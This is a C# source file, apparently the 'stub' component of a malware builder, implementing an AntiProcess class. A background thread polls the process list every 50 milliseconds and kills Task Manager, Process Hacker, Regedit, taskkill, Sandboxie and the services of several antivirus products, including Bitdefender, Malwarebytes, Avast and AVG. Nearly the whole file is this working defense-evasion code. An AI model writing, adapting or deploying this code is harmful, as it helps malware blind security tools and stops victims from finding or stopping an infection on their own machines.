﻿using System;
using System.Threading;
using System.Runtime.InteropServices;
using System.Security.Permissions;


namespace stub
{
    internal class AntiProcess
    {
        private static Thread BlockThread = new Thread(Block);
        public static bool Enabled { get; set; }

        public static void StartAntiProcess()
        {
            Enabled = true;
            BlockThread.Start();
        }
        [SecurityPermission(SecurityAction.Demand, ControlThread = true)]
        public static void StopAntiProcess()
        {
            Enabled = false;
            try
            {
                BlockThread.Abort();

                BlockThread = new Thread(Block);
            }
            catch { }
        }
        private static void Block()
        {
            while (Enabled)
            {
                IntPtr snapshot = CreateToolhelp32Snapshot(0x00000002u, 0u);
                PROCESSENTRY32 entry = new PROCESSENTRY32();
                entry.dwSize = (uint) Marshal.SizeOf(typeof(PROCESSENTRY32));
                if (Process32First(snapshot, ref entry))
                    do
                    {
                        uint id = entry.th32ProcessID;
                        string name = entry.szExeFile;

                        if (Matches(name, "Taskmgr.exe") ||
                            Matches(name, "ProcessHacker.exe") ||
                            Matches(name, "Regedit.exe") ||
                            Matches(name, "taskkill.exe") ||
                            Matches(name, "bdagent.exe") ||
                            Matches(name, "mbam.exe") ||
                            Matches(name, "MBAMService.exe") ||
                            Matches(name, "navapsvc.exe") ||
                            Matches(name, "AvastSvc.exe") ||
                            Matches(name, "avgamsvr.exe") ||
                            Matches(name, "avgemc.exe") ||
                            Matches(name, "SbieSvc.exe"))
                            KillProcess(id);
                    } while (Process32Next(snapshot, ref entry));
                CloseHandle(snapshot);
                Thread.Sleep(50);
            }
        }

        private static bool Matches(string source, string target)
        {
            return source.EndsWith(target, StringComparison.InvariantCultureIgnoreCase);
        }

        private static void KillProcess(uint processId)
        {
            IntPtr process = OpenProcess(0x0001u, false, processId);
            TerminateProcess(process, 0);
            CloseHandle(process);
        }
        #region DLL Imports

        [DllImport("kernel32.dll")]
        private static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);

        [DllImport("kernel32.dll")]
        private static extern bool Process32First(IntPtr hSnapshot, ref PROCESSENTRY32 lppe);

        [DllImport("kernel32.dll")]
        private static extern bool Process32Next(IntPtr hSnapshot, ref PROCESSENTRY32 lppe);

        [DllImport("kernel32.dll")]
        private static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

        [DllImport("kernel32.dll")]
        private static extern bool CloseHandle(IntPtr handle);

        [DllImport("kernel32.dll")]
        private static extern bool TerminateProcess(IntPtr dwProcessHandle, int exitCode);

        #endregion
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESSENTRY32
    {
        public uint dwSize;
        public uint cntUsage;
        public uint th32ProcessID;
        public IntPtr th32DefaultHeapID;
        public uint th32ModuleID;
        public uint cntThreads;
        public uint th32ParentProcessID;
        public int pcPriClassBase;
        public uint dwFlags;

        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
        public string szExeFile;
    }
}
